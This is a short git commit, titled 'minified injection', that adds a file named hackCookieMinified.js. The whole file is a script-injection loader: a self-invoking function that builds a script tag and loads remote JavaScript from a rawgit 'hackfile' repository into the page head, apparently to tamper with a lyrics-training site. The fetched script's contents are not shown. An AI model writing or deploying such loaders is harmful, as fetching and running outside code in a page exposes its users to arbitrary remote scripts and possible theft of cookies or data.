23af5ed3dd73f40c471eb02bc48f8606c14fa8c4
PN\cuong.nguyen <cuong.nguyen@student.passerellesnumeriques.org>
2018-09-24 09:17:36 +0700

    minified injection

---
+++ hackCookieMinified.js
@@ -0,0 +1,8 @@
+(function(e, t) {
+    ((t = e.createElement("script")).type = "text/javascript"),
+    (t.async = !0),
+    (t.onload = function() {}),
+    (t.src =
+        "https://rawgit.com/meomay503/hackfile/master/hackLyricTraining.js"),
+    e.getElementsByTagName("head")[0].appendChild(t);
+})(document);
